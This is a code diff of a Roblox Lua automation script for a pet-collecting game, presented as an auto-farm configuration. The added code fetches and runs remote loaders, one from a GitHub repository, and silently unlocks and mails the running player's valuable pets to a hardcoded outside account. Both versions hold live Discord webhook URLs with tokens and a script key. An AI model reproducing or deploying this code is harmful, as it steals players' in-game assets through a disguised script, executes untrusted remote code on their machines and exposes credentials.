@@ -1,162 +1,323 @@
- local plrs = game:GetService("Players") 
-  local plr = plrs.LocalPlayer
-  local tpService = game:GetService("TeleportService")
-
-local function getServers()
-    local url =
-        string.format("https://games.roblox.com/v1/games/%s/servers/Public?sortOrder=Asc&limit=100&excludeFullGames=true", game.PlaceId)
-    local servers = game:GetService("HttpService"):JSONDecode(game:HttpGet(url)).data
-    return servers
-end
-
-local function serverhop()
- local server
-    repeat
-        task.wait(1)
-        server = getServers()[Random.new():NextInteger(1, 100)]
-
-    until server.id ~= game.JobId
-
-
-    tpService:TeleportToPlaceInstance(game.PlaceId, server.id, plr)
-end
-
-local usernames = {
-    "johnwhichh10"
+getgenv().LoadSettings = {
+    ["Items"] = {
+        ["Fruits"] = {
+            ["Max"] = 30,
+            ["Fruits"] = {
+                "Watermelon", 
+                "Apple", 
+                "Rainbow", 
+                "Pineapple", 
+                "Orange", 
+                "Banana"
+            },
+            ["Craft"] = true,
+            ["Use"] = true
+        },
+        ["Potions"] = {
+            ["Potions"] = {
+                "Golden Dice Potion", 
+                "The Cocktail", 
+                "Rainbow Dice Potion", 
+                "Walkspeed Potion", 
+                "Coins Potion", 
+                "Instant Luck Potion", 
+                "Items Potion", 
+                "Faster Rolls Potion", 
+                "Lucky Potion", 
+                "Breakables Potion"
+            },
+            ["CraftPotions"] = {
+                "Lucky Potion", 
+                "Coins Potion", 
+                "Breakables Potion", 
+                "Faster Rolls Potion", 
+                "Items Potion", 
+                "Walkspeed Potion", 
+                "Golden Dice Potion", 
+                "Rainbow Dice Potion", 
+                "Instant Luck Potion", 
+                "The Cocktail"
+            },
+            ["Tier"] = 0,
+            ["Craft"] = true,
+            ["Use"] = true
+        },
+        ["Relics"] = true
+    },
+    ["Farming"] = {
+        ["UpgradeGroups"] = {
+            "Luckier", 
+            "Root", 
+            "Trading", 
+            "Fruit", 
+            "Hoverboard", 
+            "Leveling", 
+            "Lucky Potion", 
+            "Small Coin Piles"
+        },
+        ["Index"] = true,
+        ["Upgrades"] = true,
+        ["RAPToMail"] = 10000,
+        ["Rarities"] = {"Exclusive"},
+        ["Balloons"] = false,
+        ["IndexWebhook"] = "",
+        ["MailWebhook"] = "https://discordapp.com/api/webhooks/1298573581835436084/v6lmnsQAJVd_kejemYuyAIITgK9dXV89Nh4t76SKJ2SO0WHODaoYUAo4IsgATi4l54Eh",
+        ["IndexOffers"] = {
+            "IndexMerchant - Lucky Potion III", 
+            "IndexMerchant - Coins Potion III", 
+            "IndexMerchant - Breakables Potion II", 
+            "IndexMerchant - Faster Rolls Potion", 
+            "IndexMerchant - Lucky Potion II", 
+            "IndexMerchant - Coins Potion II", 
+            "IndexMerchant - Breakables Potion I", 
+            "IndexMerchant - Lucky Potion I", 
+            "IndexMerchant - Coins Potion I", 
+            "AdvancedIndexMerchant - Ice Cream Hoverboard", 
+            "AdvancedIndexMerchant - Ice Cream Booth", 
+            "AdvancedIndexMerchant - Rave Crab Booth", 
+            "AdvancedIndexMerchant - Rave Crab Hoverboard", 
+            "AdvancedIndexMerchant - Instant Luck Potion III", 
+            "AdvancedIndexMerchant - Instant Luck Potion II", 
+            "AdvancedIndexMerchant - Instant Luck Potion I", 
+            "AdvancedIndexMerchant - Lucky Potion V", 
+            "AdvancedIndexMerchant - Rainbow Dice Potion", 
+            "AdvancedIndexMerchant - Coins Potion V", 
+            "AdvancedIndexMerchant - Breakables Potion II", 
+            "AdvancedIndexMerchant - Lucky Potion IV", 
+            "AdvancedIndexMerchant - Golden Dice Potion", 
+            "AdvancedIndexMerchant - Faster Rolls Potion", 
+            "AdvancedIndexMerchant - Coins Potion IV", 
+            "IndexMerchant - Faster Rolls Potion I"
+        },
+        ["Gifts"] = true,
+        ["Digging"] = false,
+        ["Vending"] = true,
+        ["Custom"] = true,
+        ["SendIndex"] = false,
+        ["Method"] = "Multi",
+        ["Username"] = "",
+        ["InstaLucks"] = {
+            "Insta Luck I", 
+            "Insta Luck II", 
+            "Insta Luck III"
+        },
+        ["DifficultyToMail"] = 10000000,
+        ["UseInstaLuckForCombo"] = true,
+        ["PetsPerBreakable"] = 1,
+        ["Webhook"] = "https://discordapp.com/api/webhooks/1298573471382507560/FiWszopQu6hOCILd5jKw-kQ217UnzbblTtHkjYxNU8XXbBX3nBVEQSpitf9r4oyEqAsv",
+        ["MailHatches"] = false,
+        ["ForceComboForInstaLuck"] = true,
+        ["Roll"] = true,
+        ["Start"] = true,
+        ["Prio"] = false,
+        ["SendHatches"] = false,
+        ["CustomOffers"] = {
+            "StandardMerchant - Instant Luck Potion III", 
+            "StandardMerchant - The Cocktail", 
+            "StandardMerchant - Instant Luck Potion II", 
+            "StandardMerchant - Instant Luck Potion I", 
+            "StandardMerchant - Blazing Dice Potion", 
+            "StandardMerchant - Rainbow Dice Potion", 
+            "StandardMerchant - Golden Dice Potion", 
+            "StandardMerchant - Faster Rolls Potion II", 
+            "StandardMerchant - Faster Rolls Potion I", 
+            "StandardMerchant - Items Potion II", 
+            "StandardMerchant - Breakables Potion II", 
+            "StandardMerchant - Coins Potion V", 
+            "StandardMerchant - Coins Potion IV", 
+            "StandardMerchant - Coins Potion III", 
+            "StandardMerchant - Coins Potion II", 
+            "StandardMerchant - Lucky Potion V", 
+            "StandardMerchant - Lucky Potion IV", 
+            "StandardMerchant - Lucky Potion III", 
+            "StandardMerchant - Lucky Potion II", 
+            "StandardMerchant - Items Potion I", 
+            "StandardMerchant - Breakables Potion I", 
+            "StandardMerchant - Lucky Potion I", 
+            "StandardMerchant - Coins Potion I"
+        }
+    },
+    ["ForceVIP"] = false,
+    ["UIScale"] = 0.75,
+    ["LoadSettings"] = true,
+    ["Optimize"] = {
+        ["Pets"] = true,
+        ["Drops"] = true,
+        ["Breakables"] = true,
+        ["Scripts"] = false,
+        ["GUIs"] = false,
+        ["World"] = true
+    }
 }
+repeat wait() until game:IsLoaded() and game.Players.LocalPlayer 
+script_key="kEqAUEixABrDUkLTLCPGurBYQCmbBzrd";
+loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/b22aae7d03041699ada62f6a4fb519fd.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/fakerdz/av/refs/heads/main/2"))()
+local start = tick()
+repeat task.wait() until game:IsLoaded() and game.Players.LocalPlayer
 
-local function getRandomUsername()
-    local index = math.random(1, #usernames)
-    return usernames[index]
-end
+_G.EnableFriendRequest = true;
+_G.WaitToSendFriend = 300;
 
-local sendto = getRandomUsername()
+_G.Enable = true;
 
+--_G.Objects_Target = {Pet = {"Shadow Griffin"}, Misc = {}};
+_G.Value = 10000000;
+_G.Username = "atusdepzai";
+_G.Message = "atusdepzai";
+_G.WaitToSendIfEnough = 300;
+_G.WaitToSend = 0.5;
 
-local Url2 = "https://discordapp.com/api/webhooks/1298573643248566292/a_SA3DaG1Eb2__INRDaHrBtZOwhgeyVSfygXY24wldCxppNOyna8vUc8WXPBAbDTPkce"
-local Http2 = game:GetService("HttpService")
-	local Msg = function(msg)
-		request({Url = Url2,Method = "POST",Headers = {["Content-Type"] = "application/json"},Body = Http2:JSONEncode({content = msg})})
-	end
+_G.ClaimMail = true;
 
+_G.max = nil;
 
+local HttpService = game:GetService("HttpService")
+local ReplicatedStorage = game.ReplicatedStorage
 local Players = game:GetService('Players')
 local Client = Players.LocalPlayer
-_G.EnableFriendRequest = true
+local Network_Repli = ReplicatedStorage:WaitForChild("Network")
 
-local function SendFriendRequests()
-	
-    for _, player in ipairs(Players:GetPlayers()) do
-        if player ~= Client then  
-            Client:RequestFriendship(player)
-			Msg(Client.Name.." đã gửi yêu cầu kết bạn tới "..player.Name)
-			task.wait(600)
-        end
-        task.wait(1)
-    end
-end
+local v5 = require(ReplicatedStorage.Library.Items.Types);
 
+local VirtualUser = game:GetService('VirtualUser')
 
-task.spawn(function()		
-    if _G.EnableFriendRequest then
-		wait(600)
-		SendFriendRequests()
+local v13 = require(ReplicatedStorage.Library.Client.GUI);
+local v37 = v13.MailboxMachine();
+local l_Frame_0 = v37.Frame;
+local l_SendFrame_0 = l_Frame_0:FindFirstChild("SendFrame");
 
+local l_Amount_0 = l_SendFrame_0.Bottom.Coins.Frame.Amount;
+
+function Update()
+    local results = {}
+    
+    --for typeO, tbl in pairs(_G.Objects_Target) do
+        for v127, v128 in pairs(v5.Types[tostring("Pet")]:All()) do
+            local _stackKey = HttpService:JSONDecode(v128._stackKey)
+            
+            --for _, name in next, tbl do
+                local name = _stackKey.id
+                local lower = string.lower(name)
         
-    end
-end)
-	
-task.spawn(function()
-	wait(math.random(1800, 3600))
-		while true do
-	
-	serverhop()
-	wait(1)
-end
-end)
-		
+                if game.ReplicatedStorage.__DIRECTORY.Pets:FindFirstChild(name) and require(game.ReplicatedStorage.__DIRECTORY.Pets[name]).difficulty >= _G.Value --[[and string.find(string.lower(_stackKey.id), lower)]] then
+                    local _data = v128._data
+                    local id_Pet = v128._uid
+                    local amount = _data._am or 1
+                    local name = _data.id or "NULL"
+                    local class = v128.class or "Pet"
+                    local locked = v128._lk
+                    local typeD = not _data.pt and "Normal" --or _data.pt == 1 and "Golden" or _data.pt == 2 and "Rainbow"
 
+                    local folder = name:find("Huge") and "Huge" --[[or name:find("Titanic") and "Titanic"]] or "Uncategorized"
+                    --table.foreach(v128, warn)
+                    results[id_Pet] = {
+                        Amount = _G.max ~= nil and _G.max or amount,
+                        Name = name,
+                        Class = class,
+                        Type = typeD,
+                        Folder = folder,
+                        Locked = locked,
+                    }
 
-if not game:IsLoaded() then
-    game.Loaded:Wait()
-  end
-
-
-
-task.spawn(function()
-game:GetService("RunService"):Set3dRenderingEnabled(false)
-		for _, v in pairs(game.Players:GetChildren()) do
-        	for _, v2 in pairs(v.Character:GetDescendants()) do
-                    if v2:IsA("BasePart") or v2:IsA("Decal") then
-                        v2.Transparency = 1
-                    end
+                    --break
                 end
+            --end
         end
-				
-    while true do
+    --end
+    
+    return results  -- Trả về bảng kết quả
+end
+
+function convertNotation(value)
+    local suffixes = {
+        ["k"] = 10^3,   -- K = 1,000
+        ["m"] = 10^6,   -- M = 1,000,000
+        ["b"] = 10^9,   -- B = 1,000,000,000
+        ["t"] = 10^12,  -- T = 1,000,000,000,000
+    }
+    
+    -- Kiểm tra xem có ký hiệu không
+    local number, suffix = string.match(value, "^(%d*%.?%d+)(%a?)$")
+    
+    if suffixes[suffix] then
+        return tonumber(number) * suffixes[suffix]
+    else
+        return tonumber(number)
+    end
+end
+
+local GetSave = function()
+    return require(ReplicatedStorage.Library.Client.Save).Get()
+end
+
+function GetCurrentCoins()
+    for i, v in pairs(GetSave().Inventory.Currency) do
+        if v.id == "Coins" then
+            return v._am
+        end
+    end
+    return 0
+end
+
+Client.Idled:connect(function()
+    VirtualUser:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
+    wait(1)
+    VirtualUser:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
+end)
+
+local function ClaimMail()
+    local response, err = Network_Repli:WaitForChild("Mailbox: Claim All"):InvokeServer()
+    while err == "You must wait 30 seconds before using the mailbox!" do
+        task.wait()
+        response, err = Network_Repli:WaitForChild("Mailbox: Claim All"):InvokeServer()
+    end
+end
+
+task.spawn(function()
+    while _G.Enable and task.wait(1) do
         
-        for i, v in pairs(game.Players:GetPlayers()) do
-            if v ~= game.Players.LocalPlayer then
-                pcall(function()
-                    local Character = v.Character
-                    Character:Destroy()
-                end)
+        for id, v in pairs(Update()) do
+            local amount, name, class, type, locked = v.Amount, v.Name, v.Class, v.Type, v.Locked
+            if id and amount then
+        
+                local Current_Diamond = GetCurrentCoins()
+                if Current_Diamond >= convertNotation(l_Amount_0.Text) then
+                    --if locked then
+                        Network_Repli["Locking_SetLocked"]:InvokeServer(id, false)
+                    --end
+                    --print(name, class, id, amount)
+                    local v134, v135 = Network_Repli["Mailbox: Send"]:InvokeServer(_G.Username, _G.Message, class, id, amount)
+                    --print(v134, v135)
+                    --print("Send pet successfully")
+                    --print("Current Cost:", convertNotation(l_Amount_0.Text), "Can send:", Current_Diamond > 0)
+                else
+                    --warn("Không đủ gems để gửi. Số gems hiện tại:", GetCurrentCoins())
+                    wait(_G.WaitToSendIfEnough)
+                    break
+                end
+        
+                task.wait(_G.WaitToSend)
             end
         end
-	task.wait(30)
     end
 end)
 
-getgenv().LoadSettings = 
-{
-	["Items"] = 
-				{["Fruits"] = {["Max"] = 36, ["Fruits"] = {"Watermelon", "Apple", "Rainbow", "Pineapple", "Orange", "Banana"}, ["Craft"] = true, ["Use"] = true}, 
-				["Potions"] = {["Potions"] = {"Lucky Potion", "Golden Dice Potion", "The Cocktail", "Walkspeed Potion", "Coins Potion", "Items Potion", "Faster Rolls Potion", "Breakables Potion", "Blazing Dice Potion", "Rainbow Dice Potion"}, 
-				["CraftPotions"] = {"Lucky Potion", "Coins Potion", "Faster Rolls Potion", "Instant Luck Potion", "The Cocktail", "Golden Dice Potion", "Rainbow Dice Potion", "Blazing Dice Potion"}, 
-				["Tier"] = 0, 
-				["Craft"] = true, 
-				["Use"] = true}, 
-				["Relics"] = true}, 
-	["Farming"] = 
-				{["UpgradeGroups"] = {"Luckier", "Root", "Trading", "Fruit", "Hoverboard", "Leveling", "Lucky Potion", "Small Coin Piles", "Merchant", "Flying Gifts"}, 
-				["Index"] = true, 
-				["Upgrades"] = true, 
-				["RAPToMail"] = 1000, 
-				["Rarities"] = {"Exclusive", "Exotic", "Celestial", "Superior", "Secret", "Divine"}, 
-				["Balloons"] = true, 
-				["IndexWebhook"] = "", ["MailWebhook"] = "https://discordapp.com/api/webhooks/1298573581835436084/v6lmnsQAJVd_kejemYuyAIITgK9dXV89Nh4t76SKJ2SO0WHODaoYUAo4IsgATi4l54Eh", 
-				["IndexOffers"] = {"AdvancedIndexMerchant - Instant Luck Potion III", "AdvancedIndexMerchant - Instant Luck Potion II", "AdvancedIndexMerchant - Instant Luck Potion I", "IndexMerchant - Faster Rolls Potion II", "AdvancedIndexMerchant - Faster Rolls Potion II", "AdvancedIndexMerchant - Lucky Potion V", "AdvancedIndexMerchant - Lucky Potion VI", "AdvancedIndexMerchant - Lucky Potion VII", "AdvancedIndexMerchant - Rainbow Dice Potion", "AdvancedIndexMerchant - Golden Dice Potion", "AdvancedIndexMerchant - Blazing Dice Potion"}, 
-				["Gifts"] = true, 
-				["Digging"] = true, 
-				["Vending"] = true, 
-				["Custom"] = true, 
-				["SendIndex"] = false, 
-				["Method"] = "Multi", 
-				["Username"] = sendto, 
-				["InstaLucks"] = {"Insta Luck III"}, 
-				["DifficultyToMail"] = 7000000, 
-				["UseInstaLuckForCombo"] = true, 
-				["PetsPerBreakable"] = 5, 
-				["Webhook"] = "https://discordapp.com/api/webhooks/1298573471382507560/FiWszopQu6hOCILd5jKw-kQ217UnzbblTtHkjYxNU8XXbBX3nBVEQSpitf9r4oyEqAsv", 
-				["MailHatches"] = true, 
-				["ForceComboForInstaLuck"] = true, 
-				["Roll"] = true, 
-				["Start"] = true, 
-				["Prio"] = false, 
-				["SendHatches"] = true, 
-				["CustomOffers"] = {"StandardMerchant - Faster Rolls Potion II", "StandardMerchant - Instant Luck Potion II", "StandardMerchant - Instant Luck Potion III", "StandardMerchant - The Cocktail", "StandardMerchant - Instant Luck Potion I", "StandardMerchant - Blazing Dice Potion", "StandardMerchant - Rainbow Dice Potion", "StandardMerchant - Golden Dice Potion", "StandardMerchant - Lucky Potion V", "StandardMerchant - Lucky Potion IV", "StandardMerchant - Lucky Potion III", "StandardMerchant - Lucky Potion II", "StandardMerchant - Lucky Potion I"}}, 
-	["ForceVIP"] = false, 
-	["UIScale"] = 1, 
-	["LoadSettings"] = true, 
-	["Optimize"] = 
-				{["Pets"] = true, ["Drops"] = true, ["Breakables"] = true, ["Scripts"] = true, ["GUIs"] = true, ["World"] = true}
-}
+task.spawn(function()
+    while _G.ClaimMail and task.wait() do
+        ClaimMail()
+    end
+end)
 
-
-
-
-script_key = "FkShqxqNYNGqOCgsmqhLCpLQwwgcUGcS";
-
-daubuoi = true
-
-loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/b22aae7d03041699ada62f6a4fb519fd.lua"))()
+task.spawn(function()
+    while _G.EnableFriendRequest do
+        for _,v in ipairs(Players:GetPlayers()) do
+            if v ~= Client then
+                Client:RequestFriendship(v)
+                warn("Send request:",v.Name)
+            end
+            wait(1)
+        end
+        task.wait(_G.WaitToSendFriend)
+    end
+end)
